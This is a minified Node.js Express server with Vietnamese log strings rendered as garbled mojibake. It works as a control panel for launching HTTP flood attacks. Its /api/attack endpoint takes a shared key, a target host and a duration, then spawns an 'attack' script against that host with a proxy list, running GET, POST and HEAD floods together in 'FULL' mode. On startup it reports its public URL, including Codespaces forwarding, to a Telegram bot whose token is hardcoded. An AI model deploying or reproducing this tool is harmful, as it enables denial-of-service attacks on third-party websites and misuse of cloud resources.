const express=require("express"),{spawn}=require("child_process"),axios=require("axios");const app=express(),port=8080,MAX_CONCURRENT_ATTACKS=1,BOT_TOKEN="7898378784:AAH7RAql823WY3nE25ph28kyO2N20Rhqbts",CHAT_ID="7371969470";let activeAttacks=0,currentPID=null;const sendTelegramMessage=async(message)=>{try{await axios.post(`https://api.telegram.org/bot${BOT_TOKEN}/sendMessage`,{chat_id:CHAT_ID,text:message});console.log("ÄÃ£ gá»­i tin Telegram thÃ nh cÃ´ng");}catch(error){console.error("Lá»—i gá»­i Telegram:",error.message);}};const validateInput=({key,host,time,method,port})=>!([key,host,time,method,port].every(Boolean))?"THIáº¾U THAM Sá»":key!=="negan"?"KEY KHÃ”NG Há»¢P Lá»†":time>200?"THá»œI GIAN PHáº¢I < 200S":port<1||port>65535?"Cá»”NG KHÃ”NG Há»¢P Lá»†":null;const executeAttack=(command,time)=>{const childProcess=spawn(command.split(" ")[0],command.split(" ").slice(1),{stdio:"inherit"});currentPID=childProcess.pid;console.log(`ÄÃ£ khá»Ÿi cháº¡y tiáº¿n trÃ¬nh ${currentPID}`);const cleanup=()=>{activeAttacks--,currentPID=null;console.log(`ÄÃ£ káº¿t thÃºc tiáº¿n trÃ¬nh ${childProcess.pid}`);};childProcess.on("close",(code)=>{console.log(`Tiáº¿n trÃ¬nh ${childProcess.pid} Ä‘Ã£ Ä‘Ã³ng vá»›i mÃ£ ${code}`);cleanup();});childProcess.on("error",(err)=>{console.error(`Lá»—i thá»±c thi: ${err.message}`);cleanup();});setTimeout(()=>{if(currentPID===childProcess.pid){console.error(`Tiáº¿n trÃ¬nh ${childProcess.pid} bá»‹ treo vÃ  Ä‘Ã£ há»§y`);childProcess.kill();cleanup();}},time*1000+10000);};const executeAllAttacks=(methods,host,time)=>methods.map((method)=>`node attack -m ${method} -u ${host} -s ${time} -p live.txt --full true`).forEach((command)=>executeAttack(command,time));app.get("/api/attack",(req,res)=>{const{key,host,time,method,port,modul}=req.query;if(activeAttacks>=MAX_CONCURRENT_ATTACKS||currentPID)return res.status(400).json({status:"ERROR",message:"ÄANG CÃ“ CUá»˜C Táº¤N CÃ”NG KHÃC",statusCode:400});const validationMessage=validateInput({key,host,time,method,port});if(validationMessage)return res.status(400).json({status:"ERROR",message:validationMessage,statusCode:400});activeAttacks++;if(modul==="FULL"){executeAllAttacks(["GET","POST","HEAD"],host,time);res.json({status:"SUCCESS",message:"ÄÃƒ Gá»¬I Lá»†NH Táº¤N CÃ”NG (GET, POST, HEAD)",host:host,port:port,time:time,modul:"GET POST HEAD",method:method,pid:currentPID});}else{const command=`node attack -m ${modul} -u ${host} -s ${time} -p live.txt --full true`;executeAttack(command,time);res.json({status:"SUCCESS",message:"ÄÃƒ Gá»¬I Lá»†NH Táº¤N CÃ”NG",host:host,port:port,time:time,modul:modul,method:method,pid:currentPID});}});app.listen(port,()=>{console.log(`[MÃY CHá»¦ API] ÄANG CHáº Y TRÃŠN Cá»”NG ${port}`);const publicUrl=process.env.CODESPACES?`https://${process.env.CODESPACE_NAME}-${port}.${process.env.GITHUB_CODESPACES_PORT_FORWARDING_DOMAIN}`:`http://localhost:${port}`;console.log(`URL CÃ”NG KHAI: ${publicUrl}`);sendTelegramMessage(`ðŸŒ MÃ¡y chá»§ API Ä‘ang cháº¡y:\n${publicUrl}`).catch((err)=>console.error("Lá»—i gá»­i Telegram:",err));});